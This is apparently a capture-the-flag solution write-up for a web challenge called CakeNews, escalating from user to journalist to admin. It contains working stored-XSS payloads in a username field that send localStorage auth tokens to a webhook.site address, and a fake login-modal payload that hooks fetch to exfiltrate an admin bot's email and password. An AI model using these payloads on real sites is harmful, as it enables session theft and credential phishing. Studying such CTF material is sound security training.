# Solution

## 1 Step 1 - Escalate from normal user on CakeNews to journalist

### 1.1 Locate field vulnerable to XSS

When registering a user on ``CakeNews``, the ``username``-field has no sanitization or validation which allows for special characters as well as an infinite amount. This can be discovered going through the ``def api_register()``-function in ``cakenews/app.py``.

### 1.2 Locate XSS-vector

When commenting on an article, the ``username``-field is not sanitized. The ``<span>`` can be escaped by prepending ``">`` to an XSS-payload. This can be discovered when looking at ``article.js``:

```js
const renderComment = c => `
        <div class="comment-card">
          <div class="flex items-center justify-between mb-2">
            <span class="font-medium text-gray-900" data-username="${c.username}">
              ${escapeHTML(c.username)}
            </span>
```

### 1.3 Discover ``localStorage``-auth + "Report Article to Journalist"-function

When successfully logging in, two tokens are stored in localStorage: ``cakenewsAccessToken`` and ``cakenewsUserProfile``. Being logged in also reveals a ``Report article to journalist``-button on every article.

### 1.4 Craft payload to leak localStorage to attacker-controlled server

``<script>`` is blocked but a bunch of other methods exist that lets the attacker leak localStorage. Creating a user with the below payload as username, while utilizing ``webhook.site`` as attacker-controlled server, successfully achieves this:

```js
"><img src="x" onerror="fetch('https://webhook.site/46bf0aaa-d3dd-40bd-b446-fc2d089f3270?token=' + localStorage.getItem('cakenewsAccessToken') + '&profile=' + encodeURIComponent(localStorage.getItem('cakenewsUserProfile')))" />
```

### 1.5 Comment on an article and "Report article to journalist"

With the XSS-payload as username, comment on an article and report the article to journalist. This triggers the journalist-bot to visit the article and leak its access token. Now edit localStorage using browser Dev Tools.

## Step 2 - Escalate from journalist on CakeNews to Admin on Brunnernelogin

### 2.1 Locate "Report to Admin" and admin_bot's willingness to POST to login-forms

Once authenticated as a journalist, every article gets a ``Report Article to Admin`` that triggers ``admin_bot.py`` to visit the article. However, stealing an admin's session on CakeNews does nothing. Instead solvers need to identify the following part of the code:

```python
def login(browser):
    script = """
    (function(email, pwd){
        try{
            const hasToken = !!localStorage.getItem('cakenewsAccessToken');
            const hasProfile = !!localStorage.getItem('cakenewsUserProfile');
            if(hasToken || hasProfile){
                return false;
            }
        }catch(e){/* ignore and continue */}

        const modal = document.querySelector('.login-modal');
        if(!modal) return false;
        const form = modal.querySelector('form');
        let endpoint = window.location.href;
        if(form){
            endpoint = form.getAttribute('action') || endpoint;
        }
        fetch(endpoint, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({email: email, password: pwd})});
        return true;
    })(arguments[0], arguments[1]);
    """
    try:
        return browser.execute_script(script, ADMIN_EMAIL, ADMIN_PASSWORD)
    except Exception:
        return False
```

This reveals that the admin will try to log in if 2 conditions are met:

1) localStorage is empty, 
2) the admin-bot is met by a login-form:

### 2.2 Craft phishing payload that bypasses CORS

CORS is applied so a simple POST-fetch XSS-payload will only result in an ``OPTIONS`` pre-flight request as the ``webhook.site``-domain is different. Again there are several ways to bypass this but the below payload succeeds to exfiltrate the password through a GET-request:

```js
"><div class='login-modal'>
  <form action='<WEBHOOK_URL>'></form>
</div>
<img src='x' onerror="
  (function(){
    try{
      localStorage.removeItem('cakenewsAccessToken');
      localStorage.removeItem('cakenewsUserProfile');
    }catch(e){}

    var sink='<WEBHOOK_URL>';
    function exfidl(d){
      if(!d||!d.email||!d.password) return;
      new Image().src=sink+'?e='+encodeURIComponent(d.email)+'&p='+encodeURIComponent(d.password);
    }
    var f=window.fetch;
    window.fetch=function(r,i){
      try{
        if(i&&typeof i.body==='string'){
          var data=JSON.parse(i.body); exfidl(data);
        }
      }catch(e){}
      return f.apply(this,arguments);
    };
  })();
">
```

### 2.3 Log in as admin@brunnerne.ctf on Brunnernelogin

Now navigate to the ``Brunnernelogin`` SSO-portal and log in using phished credentials and obtain the flag.
